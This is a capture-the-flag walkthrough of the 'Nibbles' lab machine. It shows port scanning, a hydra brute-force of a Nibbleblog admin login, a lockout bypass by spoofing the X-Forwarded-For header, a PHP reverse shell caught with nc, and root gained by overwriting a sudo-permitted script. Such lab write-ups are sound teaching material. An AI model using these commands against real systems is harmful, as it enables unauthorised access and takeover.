# IP Address: 10.10.10.75

# Enumeration
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### HTTP
Browsing to the site, we see a basic "Hello World" heading. Inspecting the page source we find a hidden directory.

```
┌──(code㉿kali)-[~]
└─$ curl http://10.10.10.75
<b>Hello world!</b>














<!-- /nibbleblog/ directory. Nothing interesting here! -->

```

Fuzzing, we find an admin login here: http://10.10.10.75/nibbleblog/admin.php

We bruteforce the login. 

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.75 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username or password" -V
```

It looks like something is causing hydra to give false positives after a few tries. Could there be timeouts or something after some number of login failures?

Looking at the source code for this software here: https://github.com/dignajar/nibbleblog/tree/2a5f242d89b85c0aae2df95c4c95bc627ade54fd we can see there are security rules at /admin/boot/rules.

In 3-variables.bit, we can confirm that IP blacklisting is taking place. 
```
... 

define('BLACKLIST_SAVED_REQUESTS', 15);

define('BLACKLIST_LOCKING_AMOUNT', 5); // Number of failures before being locked

define('BLACKLIST_TIME', 5); // Time in minutes the ip will be blocked
...
```

Researching further, we find that a kind soul has already scripted a way around this by manipulating the X-FORWARDED-FOR header. The script lives here https://eightytwo.net/blog/brute-forcing-the-admin-password-on-nibbles/

Running this, we get: 
```
...
Attempt 2562: 71.48.240.2               cloud9
Attempt 2563: 71.48.240.2               vicky
Attempt 2564: 160.144.44.253            rosie
Attempt 2565: 160.144.44.253            jakarta
Attempt 2566: 160.144.44.253            gillian
Attempt 2567: 160.144.44.253            flakita
Attempt 2568: 55.230.85.140             darlene
Attempt 2569: 55.230.85.140             tabitha
Attempt 2570: 55.230.85.140             russel
Attempt 2571: 55.230.85.140             nibbles
Password for admin is nibbles

```

# Exploitation 

After logging in with the bruteforced credentials, we upload a php reverse shell. 

1. Navigate to Plugins >> My Image >> click Configure
2. Upload php-reverse-shell.php
3. Navigate to http://10.10.10.75/nibbleblog/content/private/plugins/my_image/ 
4. Click image.php and catch shell as nibbler

```
┌──(code㉿kali)-[~]
└─$ nc -nlvp 4488                                                                                                                              
listening on [any] 4488 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.75] 55056
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 21:04:17 up  1:00,  0 users,  load average: 0.00, 0.01, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
$
```

user.txt

![user.txt](https://github.com/codetantrum/walkthroughs/blob/master/Nibbles/images/Pasted%20image%2020211115210048.png)

# Privilege Escalation
We can run monitor.sh as root without any password.
```
$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

```

Find the personal.zip archive
```
$ cd /home/nibbler                                                                                                                             
$ ls
personal.zip
user.txt
$ unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
$ cd personal/stuff
$ ls
monitor.sh
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

# clear the screen
clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage
...
```

The script is self explanatory ("Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script") but it looks like we have write access to it. 

We backup the script and replace the original code with a command to spawn a new shell.

```
$ cp monitor.sh monitor.sh.bak
$ which bash
/bin/bash
$ echo '/bin/bash' > monitor.sh
$ sudo /home/nibbler/personal/stuff/monitor.sh
id
uid=0(root) gid=0(root) groups=0(root)

```

# Proof
root.txt

![root.txt](https://github.com/codetantrum/walkthroughs/blob/master/Nibbles/images/Pasted%20image%2020211116195608.png)
